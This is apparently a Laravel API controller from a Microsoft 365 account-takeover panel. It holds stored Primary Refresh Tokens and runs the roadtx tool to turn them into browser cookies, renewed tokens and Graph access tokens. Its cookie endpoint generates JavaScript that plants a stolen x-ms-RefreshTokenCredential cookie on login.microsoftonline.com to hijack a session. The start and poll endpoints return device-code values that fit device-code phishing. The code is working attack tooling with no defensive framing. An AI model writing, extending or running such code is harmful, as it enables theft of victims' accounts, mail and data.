<?php
namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Log;
use Illuminate\Http\Request;
use App\Models\User;
use Illuminate\Support\Str;
use Symfony\Component\Process\Process;
use Illuminate\Support\Facades\File;
use App\Models\Token;
use App\Models\CommandJob;
use App\Jobs\RunPythonCommandJob;

class CommandController extends Controller
{
    public function start(Request $request)
    {
        $trace = 'DEBUG_PYTHON';

        Log::info("[$trace] API START");

        $apiKey = $request->query('api_key');

        $user = User::where('api_key', $apiKey)->first();

        if (!$user) {
            Log::warning("[$trace] USER NOT FOUND");
            return response()->json(["error" => "Unauthorized"], 401);
        }

        Log::info("[$trace] USER OK", [
            'user_id' => $user->id
        ]);

        // 🔥 disable limit dulu untuk debug
        /*
        if (...) {}
        */

        $job = CommandJob::create([
            'user_id' => $user->id,
            'file' => null,
            'status' => 'pending',
            'timeout_seconds' => 120
        ]);

        Log::info("[$trace] JOB CREATED", [
            'job_id' => $job->id
        ]);

        RunPythonCommandJob::dispatch($job->id, $trace)
            ->onQueue('python')
            ->afterCommit();

        Log::info("[$trace] JOB DISPATCHED");

        return response()->json([
            "job_id" => $job->id,
            "trace" => $trace,
            "status" => "pending"
        ]);
    }

    public function poll(Request $request, $id)
    {
        $trace = 'DEBUG_PYTHON';

        Log::info("[$trace] POLL HIT", ['job_id' => $id]);

        $apiKey = $request->query('api_key');

        $user = User::where('api_key', $apiKey)->first();

        if (!$user) {
            return response()->json(["error" => "Unauthorized"], 401);
        }

        $job = CommandJob::where('id', $id)
            ->where('user_id', $user->id)
            ->first();

        if (!$job) {
            return response()->json(["error" => "Not found"], 404);
        }

        return response()->json([
            "job_id" => $job->id,
            "status" => $job->status,
            "user_code" => $job->user_code,
            "verification_uri" => $job->verification_uri,
            "expired" => $job->status === 'expired',
            "output" => $job->status === 'success' ? $job->output : null,
            "error" => $job->error
        ]);
    }

    public function cookie($id)
    {
        $token = Token::findOrFail($id);

        if (!$token->prt) {
            return response()->json([
                'error' => 'PRT not found'
            ], 400);
        }

        // =========================
        // 📁 TEMP FILE
        // =========================
        $tmpDir = storage_path('app/prt_tmp');

        if (!File::exists($tmpDir)) {
            File::makeDirectory($tmpDir, 0777, true);
        }

        $file = $tmpDir . '/' . Str::uuid() . '.prt';

        // 🔥 simpan PRT ke file
        File::put($file, $token->prt);

        try {

            // =========================
            // 🚀 RUN ROADTX (FIXED)
            // =========================
            $process = new Process([
                '/var/www/stepholder/venv/bin/roadtx',
                'prtcookie',
                '--prt-file',
                $file
            ]);

            // 🔥 penting banget
            $process->setWorkingDirectory(dirname($file));

            $process->setTimeout(30);
            $process->run();

            // =========================
            // 🔍 DEBUG LOG (WAJIB)
            // =========================
            \Log::info('[PRT COOKIE DEBUG]', [
                'cmd' => $process->getCommandLine(),
                'stdout' => $process->getOutput(),
                'stderr' => $process->getErrorOutput(),
                'exit_code' => $process->getExitCode()
            ]);

            if (!$process->isSuccessful()) {
                throw new \Exception(
                    $process->getErrorOutput() ?: $process->getOutput()
                );
            }

            $output = $process->getOutput();

            // =========================
            // 🔥 EXTRACT COOKIE
            // =========================
            if (!preg_match('/PRT cookie:\s*(\S+)/', $output, $match)) {
                throw new \Exception("PRT cookie not found. Output: " . $output);
            }

            $cookie = $match[1];

            // =========================
            // 🔥 BUILD JS SCRIPT
            // =========================
            $script = <<<JS
document.cookie = "x-ms-RefreshTokenCredential={$cookie}; domain=.login.microsoftonline.com; path=/; secure; samesite=none";
// Redirect after 3s
setTimeout(() => {
  window.location.href = "https://login.microsoftonline.com/?auth=2";
}, 3000);
JS;

            return response()->json([
                'script' => $script
            ]);

        } catch (\Throwable $e) {

            \Log::error('[PRT COOKIE ERROR]', [
                'error' => $e->getMessage()
            ]);

            return response()->json([
                'error' => 'Failed generate cookie',
                'message' => $e->getMessage() // 🔥 biar debug gampang
            ], 500);

        } finally {

            // =========================
            // 🧹 CLEANUP
            // =========================
            if (File::exists($file)) {
                File::delete($file);
            }
        }
    }

    public function renew($id)
    {
        $token = Token::findOrFail($id);

        if (!$token->prt) {
            return response()->json([
                'error' => 'PRT not found'
            ], 400);
        }

        // ======================================
        // 🔥 RANDOM DIR PER REQUEST (ANTI TABRAKAN)
        // ======================================
        $tmpDir = storage_path('app/prt_tmp/' . \Str::uuid());

        if (!\File::exists($tmpDir)) {
            \File::makeDirectory($tmpDir, 0777, true);
        }

        // 🔥 HARUS roadtx.prt
        $file = $tmpDir . '/roadtx.prt';

        // ======================================
        // WRITE PRT KE FILE
        // ======================================
        \File::put($file, $token->prt);

        try {

            // ======================================
            // 🔥 EXECUTE ROADTX (NO --prt-file)
            // ======================================
            $process = new Process([
                '/var/www/stepholder/venv/bin/roadtx',
                'prt',
                '-a',
                'renew'
            ]);

            // 🔥 WAJIB: working dir = folder file
            $process->setWorkingDirectory($tmpDir);
            $process->setTimeout(30);
            $process->run();

            \Log::info('[PRT RENEW DEBUG]', [
                'cmd' => $process->getCommandLine(),
                'stdout' => $process->getOutput(),
                'stderr' => $process->getErrorOutput(),
                'exit_code' => $process->getExitCode()
            ]);

            if (!$process->isSuccessful()) {
                throw new \Exception(
                    $process->getErrorOutput() ?: $process->getOutput()
                );
            }

            // ======================================
            // 🔥 VALIDASI FILE HASIL
            // ======================================
            if (!\File::exists($file)) {
                throw new \Exception("PRT file not generated");
            }

            $newPrt = \File::get($file);

            if (empty($newPrt)) {
                throw new \Exception("PRT file empty after renew");
            }

            // optional: validasi JSON
            if (!json_decode($newPrt, true)) {
                throw new \Exception("Invalid PRT JSON after renew");
            }

            // ======================================
            // 🔥 UPDATE DATABASE
            // ======================================
            $token->prt = $newPrt;
            $token->save();

            return response()->json([
                'message' => 'PRT renewed successfully',
                'prt' => json_decode($newPrt, true)
            ]);

        } catch (\Throwable $e) {

            \Log::error('[PRT RENEW ERROR]', [
                'error' => $e->getMessage()
            ]);

            return response()->json([
                'error' => 'Failed renew PRT',
                'message' => $e->getMessage()
            ], 500);

        } finally {

            // ======================================
            // 🔥 CLEANUP (DELETE FOLDER)
            // ======================================
            if (\File::exists($tmpDir)) {
                \File::deleteDirectory($tmpDir);
            }
        }
    }

    public function temp($id)
    {
        $token = Token::findOrFail($id);

        if (!$token->prt) {
            return response()->json([
                'error' => 'PRT not found'
            ], 400);
        }

        // ======================================
        // 🔥 RANDOM FOLDER (ANTI TABRAKAN)
        // ======================================
        $tmpDir = storage_path('app/prt_tmp/' . \Str::uuid());

        if (!\File::exists($tmpDir)) {
            \File::makeDirectory($tmpDir, 0777, true);
        }

        $prtFile = $tmpDir . '/roadtx.prt';
        $authFile = $tmpDir . '/.roadtools_auth';

        // ======================================
        // WRITE PRT
        // ======================================
        \File::put($prtFile, $token->prt);

        try {

            // ======================================
            // 🔥 EXECUTE ROADTX PRTAUTH
            // ======================================
            $process = new Process([
                '/var/www/stepholder/venv/bin/roadtx',
                'prtauth',
                '-c',
                'd3590ed6-52b3-4102-aeff-aad2292ab01c',
                '-r',
                'msgraph'
            ]);

            $process->setWorkingDirectory($tmpDir);
            $process->setTimeout(60);
            $process->run();

            \Log::info('[PRTAUTH DEBUG]', [
                'cmd' => $process->getCommandLine(),
                'stdout' => $process->getOutput(),
                'stderr' => $process->getErrorOutput(),
                'exit_code' => $process->getExitCode()
            ]);

            if (!$process->isSuccessful()) {
                throw new \Exception(
                    $process->getErrorOutput() ?: $process->getOutput()
                );
            }

            // ======================================
            // 🔥 VALIDASI OUTPUT FILE
            // ======================================
            if (!\File::exists($authFile)) {
                throw new \Exception(".roadtools_auth not found");
            }

            $json = \File::get($authFile);

            if (empty($json)) {
                throw new \Exception("Empty auth response");
            }

            $data = json_decode($json, true);

            if (!$data) {
                throw new \Exception("Invalid JSON response");
            }

            // ======================================
            // 🔥 AMBIL TOKEN
            // ======================================
            $accessToken = $data['accessToken'] ?? null;
            $refreshToken = $data['refreshToken'] ?? null;
            $expiresIn = $data['expiresIn'] ?? null;

            if (!$accessToken) {
                throw new \Exception("accessToken missing");
            }

            // ======================================
            // 🔥 UPDATE DATABASE
            // ======================================
            $token->access_token = $accessToken;

            if ($refreshToken) {
                $token->refresh_token = $refreshToken;
            }

            if ($expiresIn) {
                $token->expires_at = now()->addSeconds((int) $expiresIn);
            }

            $token->save();

            return response()->json([
                'message' => 'PRT auth success',
                'access_token' => substr($accessToken, 0, 50) . '...',
                'expires_in' => $expiresIn
            ]);

        } catch (\Throwable $e) {

            \Log::error('[PRTAUTH ERROR]', [
                'error' => $e->getMessage()
            ]);

            return response()->json([
                'error' => 'PRT auth failed',
                'message' => $e->getMessage()
            ], 500);

        } finally {

            // ======================================
            // 🔥 CLEANUP
            // ======================================
            if (\File::exists($tmpDir)) {
                \File::deleteDirectory($tmpDir);
            }
        }
    }

}